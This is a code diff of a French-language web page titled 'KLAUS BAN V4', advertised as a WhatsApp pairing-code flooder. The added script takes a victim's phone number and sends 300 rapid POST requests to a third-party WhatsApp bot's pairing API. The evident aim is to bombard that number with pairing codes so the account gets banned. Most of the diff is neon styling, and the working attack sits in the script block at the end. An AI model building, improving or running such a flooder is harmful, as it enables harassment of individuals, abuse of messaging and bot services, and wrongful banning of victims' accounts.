@@ -3,59 +3,247 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>KLAUS BAN V3</title>
-    <link rel="stylesheet" href="style.css">
-    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <title>KLAUS BAN V4</title>
+    <style>
+        /* CSS Démoniaque Néon Noir/Rouge */
+        @import url('https://fonts.googleapis.com/css2?family=Cinzel:wght@700&family=Orbitron:wght@400;700&display=swap');
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            background-color: #050000;
+            color: #ff0000;
+            font-family: 'Orbitron', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+            background-image: radial-gradient(circle at center, #1a0000 0%, #000000 100%);
+        }
+
+        .container {
+            width: 90%;
+            max-width: 500px;
+            background: rgba(0, 0, 0, 0.95);
+            border: 2px solid #ff0000;
+            border-radius: 15px;
+            padding: 40px 20px;
+            box-shadow: 
+                0 0 20px #ff0000, 
+                0 0 40px #ff0000 inset,
+                0 0 60px #8b0000;
+            text-align: center;
+            position: relative;
+            z-index: 1;
+        }
+
+        h1 {
+            font-family: 'Cinzel', serif;
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            text-shadow: 
+                0 0 10px #ff0000,
+                0 0 20px #ff0000,
+                0 0 40px #ff0000;
+            animation: flicker 1.5s infinite alternate;
+        }
+
+        p.subtitle {
+            color: #cc0000;
+            font-size: 0.9rem;
+            margin-bottom: 30px;
+            opacity: 0.8;
+        }
+
+        .input-group { margin-bottom: 20px; text-align: left; }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 0.9rem;
+            color: #fff;
+            text-shadow: 0 0 5px #ff0000;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 15px;
+            background: #0a0a0a;
+            border: 1px solid #ff0000;
+            color: #fff;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.1rem;
+            border-radius: 8px;
+            outline: none;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 10px #330000 inset;
+        }
+
+        input:focus {
+            border-color: #ff3333;
+            box-shadow: 0 0 20px #ff0000 inset, 0 0 15px #ff0000;
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(45deg, #8b0000, #ff0000);
+            border: none;
+            color: white;
+            font-family: 'Cinzel', serif;
+            font-size: 1.2rem;
+            cursor: pointer;
+            border-radius: 8px;
+            box-shadow: 0 0 20px #ff0000;
+            transition: transform 0.2s, box-shadow 0.2s;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 40px #ff0000;
+            background: linear-gradient(45deg, #ff0000, #ff4d4d);
+        }
+
+        button:disabled {
+            background: #333;
+            box-shadow: none;
+            cursor: not-allowed;
+            color: #666;
+        }
+
+        #status {
+            margin-top: 20px;
+            min-height: 100px;
+            text-align: left;
+            background: #000;
+            border: 1px solid #330000;
+            padding: 10px;
+            font-size: 0.85rem;
+            color: #ff4d4d;
+            max-height: 200px;
+            overflow-y: auto;
+            border-radius: 5px;
+            font-family: monospace;
+        }
+
+        .log-entry { margin-bottom: 5px; border-bottom: 1px solid #220000; padding-bottom: 2px; }
+        .success { color: #00ff00; text-shadow: 0 0 5px #00ff00; }
+        .error { color: #ff0000; text-shadow: 0 0 5px #ff0000; }
+
+        footer {
+            margin-top: 30px;
+            font-size: 0.8rem;
+            color: #660000;
+            border-top: 1px solid #330000;
+            padding-top: 10px;
+        }
+
+        @keyframes flicker {
+            0%, 18%, 22%, 25%, 53%, 57%, 100% {
+                text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 40px #ff0000;
+                opacity: 1;
+            }
+            20%, 24%, 55% { text-shadow: none; opacity: 0.5; }
+        }
+
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: #000; }
+        ::-webkit-scrollbar-thumb { background: #ff0000; border-radius: 4px; }
+    </style>
 </head>
 <body>
-    <div class="crt-overlay"></div>
+
     <div class="container">
-        <header>
-            <h1 class="glitch" data-text="KLAUS BAN V3">KLAUS BAN V3</h1>
-            <p class="subtitle">WHATSAPP MASS FLOOD BANNING SYSTEM</p>
-        </header>
+        <h1>KLAUS BAN V4</h1>
+        <p class="subtitle">Pairing Code Flooder Protocol</p>
 
-        <div class="terminal-window">
-            <div class="terminal-header">
-                <span class="dot red"></span>
-                <span class="dot yellow"></span>
-                <span class="dot green"></span>
-                <span>root@klaus-dev:~</span>
-            </div>
-            
-            <div class="input-group">
-                <label for="phoneNumber">TARGET NUMBER (E.g. 33612345678)</label>
-                <input type="text" id="phoneNumber" placeholder="+33 6 12 34 56 78" autocomplete="off">
-            </div>
-
-            <button id="startBtn" onclick="launchBan()">INITIATE BANNING SEQUENCE</button>
-
-            <div class="status-panel">
-                <div class="stat-box">
-                    <span>STATUS:</span>
-                    <span id="statusText">IDLE</span>
-                </div>
-                <div class="stat-box">
-                    <span>SENT:</span>
-                    <span id="countDisplay">0 / 300</span>
-                </div>
-                <div class="stat-box">
-                    <span>TIME REMAINING:</span>
-                    <span id="timeDisplay">03:00</span>
-                </div>
-            </div>
-
-            <div class="log-console" id="logConsole">
-                <div>> System ready.</div>
-                <div>> Waiting for target...</div>
-            </div>
+        <div class="input-group">
+            <label for="phoneNumber">Numéro WhatsApp (ex: 212600000000)</label>
+            <input type="text" id="phoneNumber" placeholder="Ex: 212600000000">
         </div>
+
+        <button id="startBtn" onclick="startBan()">LANCER LE BANNISSAGE</button>
+
+        <div id="status">En attente...</div>
 
         <footer>
             Create By Klaus Dev
         </footer>
     </div>
 
-    <script src="script.js"></script>
+    <script>
+        const API_URL = "https://kizumi-md-zmfb.onrender.com/api/pair"; 
+
+        async function startBan() {
+            const phoneInput = document.getElementById('phoneNumber').value.trim();
+            const statusDiv = document.getElementById('status');
+            const btn = document.getElementById('startBtn');
+
+            if (!phoneInput) {
+                log("Veuillez entrer un numéro.", "error");
+                return;
+            }
+
+            statusDiv.innerHTML = "";
+            btn.disabled = true;
+            btn.innerText = "BANNISSAGE EN COURS...";
+            
+            let successCount = 0;
+            let failCount = 0;
+
+            // Boucle 300 fois
+            for (let i = 1; i <= 300; i++) {
+                try {
+                    // Envoi des données exactes demandées par le bot KIZUMI MD
+                    const response = await fetch(API_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ number: phoneInput, method: 'code' })
+                    });
+
+                    if (response.ok) {
+                        const data = await response.json();
+                        // Si le bot retourne déjà un code ou un statut, on l'affiche
+                        log(`[${i}/300] Succès: ${data.code || data.message || 'OK'}`, "success");
+                        successCount++;
+                    } else {
+                        log(`[${i}/300] Erreur HTTP: ${response.status}`, "error");
+                        failCount++;
+                    }
+
+                } catch (error) {
+                    log(`[${i}/300] Erreur Réseau: ${error.message}`, "error");
+                    failCount++;
+                }
+
+                // Délai ultra-court pour rapidité
+                if (i < 300) {
+                    await new Promise(r => setTimeout(r, 50)); 
+                }
+            }
+
+            btn.disabled = false;
+            btn.innerText = "LANCER LE BANNISSAGE";
+            log("--- RÉSULTAT FINAL ---", "success");
+            log(`Tentatives: 300 | Succès: ${successCount} | Échecs: ${failCount}`);
+        }
+
+        function log(message, type = "") {
+            const statusDiv = document.getElementById('status');
+            const div = document.createElement('div');
+            div.className = `log-entry ${type}`;
+            div.innerText = message;
+            statusDiv.appendChild(div);
+            statusDiv.scrollTop = statusDiv.scrollHeight;
+        }
+    </script>
 </body>
 </html>
